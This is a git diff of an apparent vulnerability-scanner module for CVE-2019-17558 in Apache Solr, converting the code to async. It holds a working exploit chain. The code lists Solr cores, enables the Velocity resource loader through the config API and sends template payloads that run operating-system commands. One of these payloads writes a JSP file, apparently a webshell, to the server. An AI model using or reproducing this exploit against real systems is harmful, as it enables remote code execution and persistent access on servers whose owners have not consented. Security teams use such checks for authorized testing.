@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import json
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2019_17558_BaseVerify:
     def __init__(self, url):
@@ -26,7 +26,7 @@ class CVE_2019_17558_BaseVerify:
             jsp_data = reader.read()
         self.jsp_payload = self.payload.format(cmd = 'echo %s > %s.jsp' %(jsp_data, 'test'))
 
-    def check(self, send_payload = None):
+    async def check(self, send_payload = None):
        
         """
         检测是否存在漏洞
@@ -40,24 +40,20 @@ class CVE_2019_17558_BaseVerify:
             if not send_payload:
                 send_payload = self.payload.format(cmd = 'whomai')
             core_url = self.url + '/solr/admin/cores?_=1572502179076&indexInfo=false&wt=json'
-            req = request.get(core_url, headers = self.headers)
-            if req.status_code == 200 and 'responseHeader' in req.text and 'status' in req.text:
-                json_str = json.loads(req.text)
+            req = await request.get(core_url, headers = self.headers)
+            if req.status == 200 and 'responseHeader' in await req.text() and 'status' in await req.text():
+                json_str = json.loads(await req.text())
                 for i in json_str['status']:
                     core_name_url = self.url + '/solr/' + i + '/config'
-                    result = self.update_queryresponsewriter(core_name_url, send_payload)
+                    result = await self.update_queryresponsewriter(core_name_url, send_payload)
                     if result:
                         return result
-                return False
-            else:
-                return False
+
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
-    def update_queryresponsewriter(self, core_name_url, send_payload):
+    async def update_queryresponsewriter(self, core_name_url, send_payload):
 
         '''
         通过如下请求开启'params.resource.loader.enabled',其中API路径包含刚才获取的core名称
@@ -78,20 +74,17 @@ class CVE_2019_17558_BaseVerify:
             "params.resource.loader.enabled": "true"
         }
         }'''
-        req = request.post(core_name_url, headers = headers, data = payload)
-        if req.status_code == 200 and 'responseHeader' in req.text:
+        req = await request.post(core_name_url, headers = headers, data = payload)
+        if req.status == 200 and 'responseHeader' in await req.text():
             exp_url = core_name_url[:-7]
             check_payload = self.payload.format(cmd = 'echo ' + self.capta + 'win^dowslin$1ux')
-            check_req = request.get(exp_url + check_payload, headers = self.headers)
-            if check_req.status_code == 200 and self.capta in check_req.text:
-                cmd_req = request.get(exp_url + send_payload, headers = self.headers)
-                if cmd_req.status_code == 500 and send_payload == self.jsp_payload:
+            check_req = await request.get(exp_url + check_payload, headers = self.headers)
+            if check_req.status == 200 and self.capta in await check_req.text():
+                cmd_req = await request.get(exp_url + send_payload, headers = self.headers)
+                if cmd_req.status == 500 and send_payload == self.jsp_payload:
                     return '存在漏洞'
-                return cmd_req.text.strip()
-            else:
-                return False
-        else:
-            return False
+                result = await cmd_req.text()
+                return result.strip()
 
 if __name__ == '__main__':
     CVE_2019_17558 = CVE_2019_17558_BaseVerify('http://127.0.0.1:8983')
